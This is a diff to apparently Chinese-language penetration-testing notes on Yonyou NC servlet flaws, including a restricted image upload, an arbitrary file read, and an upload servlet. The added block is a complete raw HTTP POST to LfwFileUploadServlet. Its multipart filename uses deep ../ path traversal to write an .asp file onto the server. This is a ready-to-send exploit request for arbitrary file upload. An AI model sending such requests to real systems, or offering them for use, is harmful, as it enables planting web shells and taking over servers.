@@ -99,6 +99,24 @@ SaveImageServlet.class       但是只能是.png文件	可利用windows特性%00
 
 webrt/nc.uap.lfw.core.servlet.LfwFileUploadServlet   文件不知道为啥没传成功，估计要两个磁盘
 
+```
+POST /servlet/~webrt/nc.uap.lfw.core.servlet.LfwFileUploadServlet HTTP/1.1
+Host: 127.0.0.1:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
+Accept-Encoding: gzip, deflate
+Content-Length: 212
+
+
+--024ff46f71634a1c9bf8ec5820c26fa9
+Content-Disposition: form-data; name="file"; filename="/../../../../../../../../../../../../../ZOScC.asp"
+
+2flYX0pZdqd9hXwFoszSIhjGiI9
+--024ff46f71634a1c9bf8ec5820c26fa9--
+```
+
+
+
 ## 任意文件读取	
 
 OutputImageServlet.class  抽象代码， 将输入流作为文件内容返回给客户端
